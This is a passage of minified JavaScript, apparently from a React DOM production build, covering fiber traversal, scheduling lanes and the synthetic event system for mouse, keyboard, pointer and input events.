n.dangerouslySetInnerHTML!="object"||!("__html"in n.dangerouslySetInnerHTML))throw Error(S(61))}if(n.style!=null&&typeof n.style!="object")throw Error(S(62))}}function wl(e,n){if(e.indexOf("-")===-1)return typeof n.is=="string";switch(e){case"annotation-xml":case"color-profile":case"font-face":case"font-face-src":case"font-face-uri":case"font-face-format":case"font-face-name":case"missing-glyph":return!1;default:return!0}}var kl=null;function ho(e){return e=e.target||e.srcElement||window,e.correspondingUseElement&&(e=e.correspondingUseElement),e.nodeType===3?e.parentNode:e}var xl=null,tt=null,rt=null;function ps(e){if(e=ur(e)){if(typeof xl!="function")throw Error(S(280));var n=e.stateNode;n&&(n=ki(n),xl(e.stateNode,e.type,n))}}function Xa(e){tt?rt?rt.push(e):rt=[e]:tt=e}function qa(){if(tt){var e=tt,n=rt;if(rt=tt=null,ps(e),n)for(e=0;e<n.length;e++)ps(n[e])}}function Ja(e,n){return e(n)}function Za(){}var Bi=!1;function eu(e,n,t){if(Bi)return e(n,t);Bi=!0;try{return Ja(e,n,t)}finally{Bi=!1,(tt!==null||rt!==null)&&(Za(),qa())}}function Ht(e,n){var t=e.stateNode;if(t===null)return null;var r=ki(t);if(r===null)return null;t=r[n];e:switch(n){case"onClick":case"onClickCapture":case"onDoubleClick":case"onDoubleClickCapture":case"onMouseDown":case"onMouseDownCapture":case"onMouseMove":case"onMouseMoveCapture":case"onMouseUp":case"onMouseUpCapture":case"onMouseEnter":(r=!r.disabled)||(e=e.type,r=!(e==="button"||e==="input"||e==="select"||e==="textarea")),e=!r;break e;default:e=!1}if(e)return null;if(t&&typeof t!="function")throw Error(S(231,n,typeof t));return t}var Sl=!1;if(Ke)try{var kt={};Object.defineProperty(kt,"passive",{get:function(){Sl=!0}}),window.addEventListener("test",kt,kt),window.removeEventListener("test",kt,kt)}catch{Sl=!1}function Ad(e,n,t,r,i,l,o,s,a){var d=Array.prototype.slice.call(arguments,3);try{n.apply(t,d)}catch(m){this.onError(m)}}var Ot=!1,$r=null,Gr=!1,bl=null,Md={onError:function(e){Ot=!0,$r=e}};function Id(e,n,t,r,i,l,o,s,a){Ot=!1,$r=null,Ad.apply(Md,arguments)}function Dd(e,n,t,r,i,l,o,s,a){if(Id.apply(this,arguments),Ot){if(Ot){var d=$r;Ot=!1,$r=null}else throw Error(S(198));Gr||(Gr=!0,bl=d)}}function Un(e){var n=e,t=e;if(e.alternate)for(;n.return;)n=n.return;else{e=n;do n=e,n.flags&4098&&(t=n.return),e=n.return;while(e)}return n.tag===3?t:null}function nu(e){if(e.tag===13){var n=e.memoizedState;if(n===null&&(e=e.alternate,e!==null&&(n=e.memoizedState)),n!==null)return n.dehydrated}return null}function hs(e){if(Un(e)!==e)throw Error(S(188))}function zd(e){var n=e.alternate;if(!n){if(n=Un(e),n===null)throw Error(S(188));return n!==e?null:e}for(var t=e,r=n;;){var i=t.return;if(i===null)break;var l=i.alternate;if(l===null){if(r=i.return,r!==null){t=r;continue}break}if(i.child===l.child){for(l=i.child;l;){if(l===t)return hs(i),e;if(l===r)return hs(i),n;l=l.sibling}throw Error(S(188))}if(t.return!==r.return)t=i,r=l;else{for(var o=!1,s=i.child;s;){if(s===t){o=!0,t=i,r=l;break}if(s===r){o=!0,r=i,t=l;break}s=s.sibling}if(!o){for(s=l.child;s;){if(s===t){o=!0,t=l,r=i;break}if(s===r){o=!0,r=l,t=i;break}s=s.sibling}if(!o)throw Error(S(189))}}if(t.alternate!==r)throw Error(S(190))}if(t.tag!==3)throw Error(S(188));return t.stateNode.current===t?e:n}function tu(e){return e=zd(e),e!==null?ru(e):null}function ru(e){if(e.tag===5||e.tag===6)return e;for(e=e.child;e!==null;){var n=ru(e);if(n!==null)return n;e=e.sibling}return null}var iu=ke.unstable_scheduleCallback,ms=ke.unstable_cancelCallback,Bd=ke.unstable_shouldYield,Ud=ke.unstable_requestPaint,G=ke.unstable_now,Fd=ke.unstable_getCurrentPriorityLevel,mo=ke.unstable_ImmediatePriority,lu=ke.unstable_UserBlockingPriority,Qr=ke.unstable_NormalPriority,Hd=ke.unstable_LowPriority,ou=ke.unstable_IdlePriority,gi=null,Be=null;function Vd(e){if(Be&&typeof Be.onCommitFiberRoot=="function")try{Be.onCommitFiberRoot(gi,e,void 0,(e.current.flags&128)===128)}catch{}}var Re=Math.clz32?Math.clz32:Gd,Wd=Math.log,$d=Math.LN2;function Gd(e){return e>>>=0,e===0?32:31-(Wd(e)/$d|0)|0}var wr=64,kr=4194304;function Nt(e){switch(e&-e){case 1:return 1;case 2:return 2;case 4:return 4;case 8:return 8;case 16:return 16;case 32:return 32;case 64:case 128:case 256:case 512:case 1024:case 2048:case 4096:case 8192:case 16384:case 32768:case 65536:case 131072:case 262144:case 524288:case 1048576:case 2097152:return e&4194240;case 4194304:case 8388608:case 16777216:case 33554432:case 67108864:return e&130023424;case 134217728:return 134217728;case 268435456:return 268435456;case 536870912:return 536870912;case 1073741824:return 1073741824;default:return e}}function Kr(e,n){var t=e.pendingLanes;if(t===0)return 0;var r=0,i=e.suspendedLanes,l=e.pingedLanes,o=t&268435455;if(o!==0){var s=o&~i;s!==0?r=Nt(s):(l&=o,l!==0&&(r=Nt(l)))}else o=t&~i,o!==0?r=Nt(o):l!==0&&(r=Nt(l));if(r===0)return 0;if(n!==0&&n!==r&&!(n&i)&&(i=r&-r,l=n&-n,i>=l||i===16&&(l&4194240)!==0))return n;if(r&4&&(r|=t&16),n=e.entangledLanes,n!==0)for(e=e.entanglements,n&=r;0<n;)t=31-Re(n),i=1<<t,r|=e[t],n&=~i;return r}function Qd(e,n){switch(e){case 1:case 2:case 4:return n+250;case 8:case 16:case 32:case 64:case 128:case 256:case 512:case 1024:case 2048:case 4096:case 8192:case 16384:case 32768:case 65536:case 131072:case 262144:case 524288:case 1048576:case 2097152:return n+5e3;case 4194304:case 8388608:case 16777216:case 33554432:case 67108864:return-1;case 134217728:case 268435456:case 536870912:case 1073741824:return-1;default:return-1}}function Kd(e,n){for(var t=e.suspendedLanes,r=e.pingedLanes,i=e.expirationTimes,l=e.pendingLanes;0<l;){var o=31-Re(l),s=1<<o,a=i[o];a===-1?(!(s&t)||s&r)&&(i[o]=Qd(s,n)):a<=n&&(e.expiredLanes|=s),l&=~s}}function El(e){return e=e.pendingLanes&-1073741825,e!==0?e:e&1073741824?1073741824:0}function su(){var e=wr;return wr<<=1,!(wr&4194240)&&(wr=64),e}function Ui(e){for(var n=[],t=0;31>t;t++)n.push(e);return n}function sr(e,n,t){e.pendingLanes|=n,n!==536870912&&(e.suspendedLanes=0,e.pingedLanes=0),e=e.eventTimes,n=31-Re(n),e[n]=t}function Yd(e,n){var t=e.pendingLanes&~n;e.pendingLanes=n,e.suspendedLanes=0,e.pingedLanes=0,e.expiredLanes&=n,e.mutableReadLanes&=n,e.entangledLanes&=n,n=e.entanglements;var r=e.eventTimes;for(e=e.expirationTimes;0<t;){var i=31-Re(t),l=1<<i;n[i]=0,r[i]=-1,e[i]=-1,t&=~l}}function go(e,n){var t=e.entangledLanes|=n;for(e=e.entanglements;t;){var r=31-Re(t),i=1<<r;i&n|e[r]&n&&(e[r]|=n),t&=~i}}var M=0;function au(e){return e&=-e,1<e?4<e?e&268435455?16:536870912:4:1}var uu,vo,cu,du,fu,Cl=!1,xr=[],an=null,un=null,cn=null,Vt=new Map,Wt=new Map,tn=[],Xd="mousedown mouseup touchcancel touchend touchstart auxclick dblclick pointercancel pointerdown pointerup dragend dragstart drop compositionend compositionstart keydown keypress keyup input textInput copy cut paste click change contextmenu reset submit".split(" ");function gs(e,n){switch(e){case"focusin":case"focusout":an=null;break;case"dragenter":case"dragleave":un=null;break;case"mouseover":case"mouseout":cn=null;break;case"pointerover":case"pointerout":Vt.delete(n.pointerId);break;case"gotpointercapture":case"lostpointercapture":Wt.delete(n.pointerId)}}function xt(e,n,t,r,i,l){return e===null||e.nativeEvent!==l?(e={blockedOn:n,domEventName:t,eventSystemFlags:r,nativeEvent:l,targetContainers:[i]},n!==null&&(n=ur(n),n!==null&&vo(n)),e):(e.eventSystemFlags|=r,n=e.targetContainers,i!==null&&n.indexOf(i)===-1&&n.push(i),e)}function qd(e,n,t,r,i){switch(n){case"focusin":return an=xt(an,e,n,t,r,i),!0;case"dragenter":return un=xt(un,e,n,t,r,i),!0;case"mouseover":return cn=xt(cn,e,n,t,r,i),!0;case"pointerover":var l=i.pointerId;return Vt.set(l,xt(Vt.get(l)||null,e,n,t,r,i)),!0;case"gotpointercapture":return l=i.pointerId,Wt.set(l,xt(Wt.get(l)||null,e,n,t,r,i)),!0}return!1}function pu(e){var n=Nn(e.target);if(n!==null){var t=Un(n);if(t!==null){if(n=t.tag,n===13){if(n=nu(t),n!==null){e.blockedOn=n,fu(e.priority,function(){cu(t)});return}}else if(n===3&&t.stateNode.current.memoizedState.isDehydrated){e.blockedOn=t.tag===3?t.stateNode.containerInfo:null;return}}}e.blockedOn=null}function Ar(e){if(e.blockedOn!==null)return!1;for(var n=e.targetContainers;0<n.length;){var t=Tl(e.domEventName,e.eventSystemFlags,n[0],e.nativeEvent);if(t===null){t=e.nativeEvent;var r=new t.constructor(t.type,t);kl=r,t.target.dispatchEvent(r),kl=null}else return n=ur(t),n!==null&&vo(n),e.blockedOn=t,!1;n.shift()}return!0}function vs(e,n,t){Ar(e)&&t.delete(n)}function Jd(){Cl=!1,an!==null&&Ar(an)&&(an=null),un!==null&&Ar(un)&&(un=null),cn!==null&&Ar(cn)&&(cn=null),Vt.forEach(vs),Wt.forEach(vs)}function St(e,n){e.blockedOn===n&&(e.blockedOn=null,Cl||(Cl=!0,ke.unstable_scheduleCallback(ke.unstable_NormalPriority,Jd)))}function $t(e){function n(i){return St(i,e)}if(0<xr.length){St(xr[0],e);for(var t=1;t<xr.length;t++){var r=xr[t];r.blockedOn===e&&(r.blockedOn=null)}}for(an!==null&&St(an,e),un!==null&&St(un,e),cn!==null&&St(cn,e),Vt.forEach(n),Wt.forEach(n),t=0;t<tn.length;t++)r=tn[t],r.blockedOn===e&&(r.blockedOn=null);for(;0<tn.length&&(t=tn[0],t.blockedOn===null);)pu(t),t.blockedOn===null&&tn.shift()}var it=Je.ReactCurrentBatchConfig,Yr=!0;function Zd(e,n,t,r){var i=M,l=it.transition;it.transition=null;try{M=1,yo(e,n,t,r)}finally{M=i,it.transition=l}}function ef(e,n,t,r){var i=M,l=it.transition;it.transition=null;try{M=4,yo(e,n,t,r)}finally{M=i,it.transition=l}}function yo(e,n,t,r){if(Yr){var i=Tl(e,n,t,r);if(i===null)Xi(e,n,r,Xr,t),gs(e,r);else if(qd(i,e,n,t,r))r.stopPropagation();else if(gs(e,r),n&4&&-1<Xd.indexOf(e)){for(;i!==null;){var l=ur(i);if(l!==null&&uu(l),l=Tl(e,n,t,r),l===null&&Xi(e,n,r,Xr,t),l===i)break;i=l}i!==null&&r.stopPropagation()}else Xi(e,n,r,null,t)}}var Xr=null;function Tl(e,n,t,r){if(Xr=null,e=ho(r),e=Nn(e),e!==null)if(n=Un(e),n===null)e=null;else if(t=n.tag,t===13){if(e=nu(n),e!==null)return e;e=null}else if(t===3){if(n.stateNode.current.memoizedState.isDehydrated)return n.tag===3?n.stateNode.containerInfo:null;e=null}else n!==e&&(e=null);return Xr=e,null}function hu(e){switch(e){case"cancel":case"click":case"close":case"contextmenu":case"copy":case"cut":case"auxclick":case"dblclick":case"dragend":case"dragstart":case"drop":case"focusin":case"focusout":case"input":case"invalid":case"keydown":case"keypress":case"keyup":case"mousedown":case"mouseup":case"paste":case"pause":case"play":case"pointercancel":case"pointerdown":case"pointerup":case"ratechange":case"reset":case"resize":case"seeked":case"submit":case"touchcancel":case"touchend":case"touchstart":case"volumechange":case"change":case"selectionchange":case"textInput":case"compositionstart":case"compositionend":case"compositionupdate":case"beforeblur":case"afterblur":case"beforeinput":case"blur":case"fullscreenchange":case"focus":case"hashchange":case"popstate":case"select":case"selectstart":return 1;case"drag":case"dragenter":case"dragexit":case"dragleave":case"dragover":case"mousemove":case"mouseout":case"mouseover":case"pointermove":case"pointerout":case"pointerover":case"scroll":case"toggle":case"touchmove":case"wheel":case"mouseenter":case"mouseleave":case"pointerenter":case"pointerleave":return 4;case"message":switch(Fd()){case mo:return 1;case lu:return 4;case Qr:case Hd:return 16;case ou:return 536870912;default:return 16}default:return 16}}var ln=null,wo=null,Mr=null;function mu(){if(Mr)return Mr;var e,n=wo,t=n.length,r,i="value"in ln?ln.value:ln.textContent,l=i.length;for(e=0;e<t&&n[e]===i[e];e++);var o=t-e;for(r=1;r<=o&&n[t-r]===i[l-r];r++);return Mr=i.slice(e,1<r?1-r:void 0)}function Ir(e){var n=e.keyCode;return"charCode"in e?(e=e.charCode,e===0&&n===13&&(e=13)):e=n,e===10&&(e=13),32<=e||e===13?e:0}function Sr(){return!0}function ys(){return!1}function Se(e){function n(t,r,i,l,o){this._reactName=t,this._targetInst=i,this.type=r,this.nativeEvent=l,this.target=o,this.currentTarget=null;for(var s in e)e.hasOwnProperty(s)&&(t=e[s],this[s]=t?t(l):l[s]);return this.isDefaultPrevented=(l.defaultPrevented!=null?l.defaultPrevented:l.returnValue===!1)?Sr:ys,this.isPropagationStopped=ys,this}return V(n.prototype,{preventDefault:function(){this.defaultPrevented=!0;var t=this.nativeEvent;t&&(t.preventDefault?t.preventDefault():typeof t.returnValue!="unknown"&&(t.returnValue=!1),this.isDefaultPrevented=Sr)},stopPropagation:function(){var t=this.nativeEvent;t&&(t.stopPropagation?t.stopPropagation():typeof t.cancelBubble!="unknown"&&(t.cancelBubble=!0),this.isPropagationStopped=Sr)},persist:function(){},isPersistent:Sr}),n}var mt={eventPhase:0,bubbles:0,cancelable:0,timeStamp:function(e){return e.timeStamp||Date.now()},defaultPrevented:0,isTrusted:0},ko=Se(mt),ar=V({},mt,{view:0,detail:0}),nf=Se(ar),Fi,Hi,bt,vi=V({},ar,{screenX:0,screenY:0,clientX:0,clientY:0,pageX:0,pageY:0,ctrlKey:0,shiftKey:0,altKey:0,metaKey:0,getModifierState:xo,button:0,buttons:0,relatedTarget:function(e){return e.relatedTarget===void 0?e.fromElement===e.srcElement?e.toElement:e.fromElement:e.relatedTarget},movementX:function(e){return"movementX"in e?e.movementX:(e!==bt&&(bt&&e.type==="mousemove"?(Fi=e.screenX-bt.screenX,Hi=e.screenY-bt.screenY):Hi=Fi=0,bt=e),Fi)},movementY:function(e){return"movementY"in e?e.movementY:Hi}}),ws=Se(vi),tf=V({},vi,{dataTransfer:0}),rf=Se(tf),lf=V({},ar,{relatedTarget:0}),Vi=Se(lf),of=V({},mt,{animationName:0,elapsedTime:0,pseudoElement:0}),sf=Se(of),af=V({},mt,{clipboardData:function(e){return"clipboardData"in e?e.clipboardData:window.clipboardData}}),uf=Se(af),cf=V({},mt,{data:0}),ks=Se(cf),df={Esc:"Escape",Spacebar:" ",Left:"ArrowLeft",Up:"ArrowUp",Right:"ArrowRight",Down:"ArrowDown",Del:"Delete",Win:"OS",Menu:"ContextMenu",Apps:"ContextMenu",Scroll:"ScrollLock",MozPrintableKey:"Unidentified"},ff={8:"Backspace",9:"Tab",12:"Clear",13:"Enter",16:"Shift",17:"Control",18:"Alt",19:"Pause",20:"CapsLock",27:"Escape",32:" ",33:"PageUp",34:"PageDown",35:"End",36:"Home",37:"ArrowLeft",38:"ArrowUp",39:"ArrowRight",40:"ArrowDown",45:"Insert",46:"Delete",112:"F1",113:"F2",114:"F3",115:"F4",116:"F5",117:"F6",118:"F7",119:"F8",120:"F9",121:"F10",122:"F11",123:"F12",144:"NumLock",145:"ScrollLock",224:"Meta"},pf={Alt:"altKey",Control:"ctrlKey",Meta:"metaKey",Shift:"shiftKey"};function hf(e){var n=this.nativeEvent;return n.getModifierState?n.getModifierState(e):(e=pf[e])?!!n[e]:!1}function xo(){return hf}var mf=V({},ar,{key:function(e){if(e.key){var n=df[e.key]||e.key;if(n!=="Unidentified")return n}return e.type==="keypress"?(e=Ir(e),e===13?"Enter":String.fromCharCode(e)):e.type==="keydown"||e.type==="keyup"?ff[e.keyCode]||"Unidentified":""},code:0,location:0,ctrlKey:0,shiftKey:0,altKey:0,metaKey:0,repeat:0,locale:0,getModifierState:xo,charCode:function(e){return e.type==="keypress"?Ir(e):0},keyCode:function(e){return e.type==="keydown"||e.type==="keyup"?e.keyCode:0},which:function(e){return e.type==="keypress"?Ir(e):e.type==="keydown"||e.type==="keyup"?e.keyCode:0}}),gf=Se(mf),vf=V({},vi,{pointerId:0,width:0,height:0,pressure:0,tangentialPressure:0,tiltX:0,tiltY:0,twist:0,pointerType:0,isPrimary:0}),xs=Se(vf),yf=V({},ar,{touches:0,targetTouches:0,changedTouches:0,altKey:0,metaKey:0,ctrlKey:0,shiftKey:0,getModifierState:xo}),wf=Se(yf),kf=V({},mt,{propertyName:0,elapsedTime:0,pseudoElement:0}),xf=Se(kf),Sf=V({},vi,{deltaX:function(e){return"deltaX"in e?e.deltaX:"wheelDeltaX"in e?-e.wheelDeltaX:0},deltaY:function(e){return"deltaY"in e?e.deltaY:"wheelDeltaY"in e?-e.wheelDeltaY:"wheelDelta"in e?-e.wheelDelta:0},deltaZ:0,deltaMode:0}),bf=Se(Sf),Ef=[9,13,27,32],So=Ke&&"CompositionEvent"in window,Rt=null;Ke&&"documentMode"in document&&(Rt=document.documentMode);var Cf=Ke&&"TextEvent"in window&&!Rt,gu=Ke&&(!So||Rt&&8<Rt&&11>=Rt),Ss=" ",bs=!1;function vu(e,n){switch(e){case"keyup":return Ef.indexOf(n.keyCode)!==-1;case"keydown":return n.keyCode!==229;case"keypress":case"mousedown":case"focusout":return!0;default:return!1}}function yu(e){return e=e.detail,typeof e=="object"&&"data"in e?e.data:null}var $n=!1;function Tf(e,n){switch(e){case"compositionend":return yu(n);case"keypress":return n.which!==32?null:(bs=!0,Ss);case"textInput":return e=n.data,e===Ss&&bs?null:e;default:return null}}function _f(e,n){if($n)return e==="compositionend"||!So&&vu(e,n)?(e=mu(),Mr=wo=ln=null,$n=!1,e):null;switch(e){case"paste":return null;case"keypress":if(!(n.ctrlKey||n.altKey||n.metaKey)||n.ctrlKey&&n.altKey){if(n.char&&1<n.char.length)return n.char;if(n.which)return String.fromCharCode(n.which)}return null;case"compositionend":return gu&&n.locale!=="ko"?null:n.data;default:return null}}var Pf={color:!0,date:!0,datetime:!0,"datetime-local":!0,email:!0,month:!0,number:!0,password:!0,range:!0,search:!0,tel:!0,text:!0,time:!0,url:!0,week:!0};function Es(e){var n=e&&e.nodeName&&e.nodeName.toLowerCase();return n==="input"?!!Pf[e.type]:n==="textarea"}function wu(e,n,t,r){Xa(r),n=qr(n,"onChange"),0<n.length&&(t=new ko("onChange","change",null,t,r),e.push({event:t,listeners:n}))}var At=null,Gt=null;function Nf(e){Lu(e,0)}function yi(e){var n=Kn(e);if(Va(n))return e}function Lf(e,n){if(e==="change")return n}var ku=!1;if(Ke){var Wi;if(Ke){var $i="oninput"in document;if(!$i){var Cs=document.createElement("div");Cs.setAttribute("oninput","return;"),$i=typeof Cs.oninput=="function"}Wi=$i}else Wi=!1;ku=Wi&&(!document.documentMode||9<document.documentMode)}function Ts(){At&&(At.detachEvent("onpropertychange",xu),Gt=At=null)}function xu(e){if(e.propertyName==="value"&&yi(Gt)){var n=[];wu(n,Gt,e,ho(e)),eu(Nf,n)}}function jf(e,n,t){e==="focusin"?(Ts(),At=n,Gt=t,At.attachEvent("onpropertychange",xu)):e==="focusout"&&Ts()}function Of(e){if(e==="selectionchange"||e==="keyup"||e==="keydown")return yi(Gt)}function Rf(e,n){if(e==="click")return yi(n)}function Af(e,n){if(e==="input"||e==="change")return yi(n)}function Mf(e,n){return e===n&&(e!==0||1/e===1/n)||e!==e&&n!==n}var Me=typeof Object.is=="function"?Object.is:Mf;function Qt(e,n){if(Me(e,n))return!0;if(typeof e!="object"||e===null||typeof n!="object"||n===null)return!1;var t=Object.keys(e),r=Object.keys(n);if(t.length!==r.length)return!1;for(r=0;r<t.length;r++){var i=t[r];if(!al.call(n,i)||!Me(e[i],n[i]))return!1}return!0}function _s(e){for(;e&&e.firstChild;)e=e.firstChild;return e}function Ps(e,n){var t=_s(e);e=0;for(var r;t;){if(t.nodeType===3){if(r=e+t.textContent.length,e<=n&&r>=n)return{node:t,offset:n-e};e=r}e:{for(;t;){if(t.nextSibling){t=t.nextSibling;break e}t=t.parentNode}t=void 0}t=_s(t)}}function Su(e,n){return e&&n?e===n?!0:e&&e.nodeType===3?!1:n&&n.nodeType===3?Su(e,n.parentNode):"contains"in e?e.contains(n):e.compareDocumentPosition?!!(e.compareDocumentPosition(n)&16):!1:!1}function bu(){for(var e=window,n=Wr();n instanceof e.HTMLIFrameElement;){try{var t=typeof n.contentWindow.location.href=="string"}catch{t=!1}if(t)e=n.contentWindow;else break;n=Wr(e.document)}return n}function bo(e){var n=e&&e.nodeName&&e.nodeName.toLowerCase();return n&&(n==="input"&&(e.type==="text"||e.type==="search"||e.type==="tel"||e.type==="url"||e.type==="password")||n==="textarea"||e.contentEditable==="true")}function If(e){var n=bu(),t=e.focusedElem,r=e.selectionRange;if(n!==t&&t&&t.ownerDocument&&Su(t.ownerDocument.documentElement,t)){if(r!==null&&bo(t)){if(n=r.start,e=r.end,e===void 0&&(e=n),"selectionStart"in t)t.selectionStart=n,t.selectionEnd=Math.min(e,t.value.length);else if(e=(n=t.ownerDocument||document)&&n.defaultView||window,e.getSelection){e=e.getSelection();var i=t.textContent.length,l=Math.min(r.start,i);r=r.end===void 0?l:Math.min(r.end,i),!e.extend&&l>r&&(i=r,r=l,l=i),i=Ps(t,l);var o=Ps(t,r);i&&o&&(e.rangeCount!==1||e.anchorNode!==i.node||e.anchorOffset!==i.offset||e.focusNode!==o.node||e.focusOffset!==o.offset)&&(n=n.createRange(),n.setStart(i.node,i.offset),e.removeAllRanges(),l>r?(e.addRange(n),e.extend(o.node,o.offset)):(n.setEnd(o.node,o.offset),e.addRange(n)))}}for(n=[],e=t;e=e.parentNode;)e.nodeType===1&&n.push({element:e,left:e.scrollLeft,top:e.scrollTop});for(typeof t.focus=="function"&&t.focus(),t=0;t<n.length;t++)e=n[t],e.element.scrollLeft=e.left,e.element.scrollTop=e.top}}var Df=Ke&&"documentMode"in document&&11>=document.documentMode,Gn=null,_l=null,Mt=null,Pl=!1;function Ns(e,n,t){var r=t.window===t?t.document:t.nodeType===9?t:t.ownerDocument;Pl||Gn==null||Gn!==Wr(r)||(r=Gn,"selectionStart"in r&&bo(r)?r={start:r.selectionStart,end:r.selectionEnd}:(r=(r.ownerDocument&&r.ownerDocument.defaultView||window).getSelection(),r={anchorNode:r.anchorNode,anchorOffset:r.anchorOffset,focusNode:r.focusNode,focusOffset:r.focusOffset}),Mt&&Qt(Mt,r)||(Mt=r,r=qr(_l,"onSelect"),0<r.length&&(n=new ko("onSelect","select",null,n,t),e.push({event:n,listeners:r}),n.target=Gn)))}function br(e,n){var t={};return t[e.toLowerCase()]=n.toLowerCase(),t["Webkit"+e]="webkit"+n,t["Moz"+e]="moz"+n,t}var Qn={animationend:br("Animation","AnimationEnd"),animationiteration:br("Animation","AnimationIteration"),animationstart:br("Animation","AnimationStart"),transitionend:br("Transition","TransitionEnd")},Gi={},Eu={};Ke&&(Eu=document.createElement("div").style,"AnimationEvent"in window||(delete Qn.animationend.animation,delete Qn.animationiteration.animation,delete Qn.animationstart.animation),"TransitionEvent"in window||delete Qn.transitionend.transition);function wi(e){if(Gi[e])return Gi[e];if(!Qn[e])return e;var n=Qn[e],t;for(t in n)if(n.hasOwnProperty(t)&&t in Eu)return Gi[e]=n[t];return e}var Cu=wi("animationend"),Tu=wi("animationiteration"),_u=wi("animationstart"),Pu=wi("transitionend"),Nu=new Map,Ls="abort auxClick cancel canPlay canPlayThrough click close contextMenu copy cut drag dragEnd dragEnter dragExit dragLeave dragOver dragStart drop durationChange emptied encrypted ended error gotPointerCapture input invalid keyDown keyPress keyUp load loadedData loadedMetadata loadStart lostPointerCapture mouseDown mouseMove mouseOut mouseOver mouseUp paste pause play playing pointerCancel pointerDown pointerMove pointerOut pointerOver pointerUp progress rateChange reset resize seeked seeking stalled submit suspend timeUpdate touchCancel touchEnd touchStart volumeChange scroll toggle touchMove waiting wheel".split(" ");function wn(e,n){Nu.set(e,n),Bn(n,[e])}for(var Qi=0;Qi<Ls.length;Qi++){var Ki=Ls[Qi],zf=Ki.toLowerCase(),Bf=Ki[0].toUpperCase()+Ki.slice(1);wn(zf,"on"+Bf)}wn(Cu,"onAnimationEnd");wn(Tu,"onAnimationIteration");wn(_u,"onAnimationStart");wn("dblclick","onDoubleClick");wn("focusin","onFocus");wn("focusout","onBlur");wn(Pu,"onTransitionEnd");st("onMouseEnter",["mouseout","mouseover"]);st("onMouseLeave",["mouseout","mouseover"]);st("onPointerEnter",["pointerout","pointerover"]);st("onPointerLeave",["pointerout","pointerover"]);Bn("onChange","change click focusin focusout input keydown keyup selectionchange".split(" "));Bn("onSelect","focusout contextmenu dragend focusin keydown keyup mousedown mouseup selectionchange".split(" "));Bn("onBeforeInput",["compositionend","keypress","textInput","paste"]);Bn("onCompositionEnd","compositionend focusout keydown keypress keyup mousedown".split(" "));Bn("onCompositionStart","compositionstart focusout keydown keypress keyup mousedown".split(" "));Bn("onCompositionUpdate","compositionupdate focusout keydown keypress keyup mousedown".split(" "));var Lt="abort canplay canplaythrough durationchange emptied encrypted ended error loadeddata loadedmetadata loadstart pause play playing progress ratechange resize seeked seeking stalled suspend timeupdate volumechange waiting".split(" "),Uf=new Set("cancel close invalid load scroll toggle".split(" ").concat(Lt));function js(e,n,t){var r=e.type||"unknown-event";e.currentTarget=t,Dd(r,n,void 0,e),e.currentTarget=null}function Lu(e,n){n=(n&4)!==0;for(var t=0;t<e.length;t++){var r=e[t],i=r.event;r=r.listeners;e:{var l=void 0;if(n)for(var o=r.length-1;0<=o;o--){var s=r[o],a=s.instance,d=s.currentTarget;if(s=s.listener,a!==l&&i.isPropagationStopped())break e;js(i,s,d),l=a}else for(o=0;o<r.length;o++){if(s=r[o],a=s.instance,d=s.currentTarget,s=s.listener,a!==l&&i.isPropagationStopped())break e;js(i,s,d),l=a}}}if(Gr)throw e=bl,Gr=!1,bl=null,e}function D(e,n){var t=n[Rl];t===void 0&&(t=n[Rl]=new Set);var r=e+"__bubble";t.has(r)||(ju(n,e,2,!1),t.add(r))}function Yi(e,n,t){var r=0;n&&(r|=4),ju(t,e,r,n)}var Er="_reactListening"+Math.random().toString(36).slice(2);function Kt(e){if(!e[Er]){e[Er]=!0,za.forEach(function(t){t!=="selectionchange"&&(Uf.has(t)||Yi(t,!1,e),Yi(t,!0,e))});var n=e.nodeType===9?e:e.ownerDocument;n===null||n[Er]||(n[Er]=!0,Yi("selectionchange",!1,n))}}function ju(e,n,t,r){switch(hu(n)){case 1:var i=Zd;break;case 4:i=ef;break;default:i=yo}t=i.bind(null,n,t,e),i=void 0,!Sl||n!=="touchstart"&&n!=="touchmove"&&n!=="wheel"||(i=!0),r?i!==void 0?e.addEventListener(n,t,{capture:!0,passive:i}):e.addEventListener(n,t,!0):i!==void 0?e.addEventListener(n,t,{passive:i}):e.addEventListener(n,t,!1)}function Xi(e,n,t,r,i){var l=r;if(!(n&1)&&!(n&2)&&r!==null)e:for(;;){if(r===null)return;var o=r.tag;if(o===3||o===4){var s=r.stateNode.containerInfo;if(s===i||s.nodeType===8&&s.parentNode===i)break;if(o===4)for(o=r.return;o!==null;){var a=o.tag;if((a===3||a===4)&&(a=o.stateNode.containerInfo,a===i||a.nodeType===8&&a.parentNode===i))return;o=o.return}for(;s!==null;){if(o=Nn(s),o===null)return;if(a=o.tag,a===5||a===6){r=l=o;continue e}s=s.parentNode}}r=r.return}eu(function(){var d=l,m=ho(t),h=[];e:{var g=Nu.get(e);if(g!==void 0){var k=ko,w=e;switch(e){case"keypress":if(Ir(t)===0)break e;case"keydown":case"keyup":k=gf;break;case"focusin":w="focus",k=Vi;break;case"focusout":w="blur",k=Vi;break;case"beforeblur":case"afterblur":k=Vi;break;case"click":if(t.button===2)break e;case"auxclick":case"dblclick":case"mousedown":case"mousemove":case"mouseup":case"mouseout":case"mouseover":case"contextmenu":k=ws;break;case"drag":case"dragend":case"dragenter":case"dragexit":case"dragleave":case"dragover":case"dragstart":case"drop":k=rf;break;case"touchcancel":case"touchend":case"touchmove":case"touchstart":k=wf;break;case Cu:case Tu:case _u:k=sf;break;case Pu:k=xf;break;case"scroll":k=nf;break;case"wheel":k=bf;break;case"copy":case"cut":case"paste":k=uf;break;case"gotpointercapture":case"lostpointercapture":case"pointercancel":case"pointerdown":case"pointermove":case"pointerout":case"pointerover":case"pointerup":k=xs}var x=(n&4)!==0,C=!x&&e==="scroll",p=x?g!==null?g+"Capture":null:g;x=[];for(var c=d,f;c!==null;){f=c;var v=f.stateNode;if(f.tag===5&&v!==null&&(f=v,p!==null&&(v=Ht(c,p),v!=null&&x.push(Yt(c,v,f)))),C)break;c=c.return}0<x.length&&(g=new k(g,w,null,t,m),h.push({event:g,listeners:x}))}}if(!(n&7)){e:{if(g=e==="mouseover"||e==="pointerover",k=e==="mouseout"||e==="pointerout",g&&t!==kl&&(w=t.relatedTarget||t.fromElement)&&(Nn(w)||w[Ye]))break 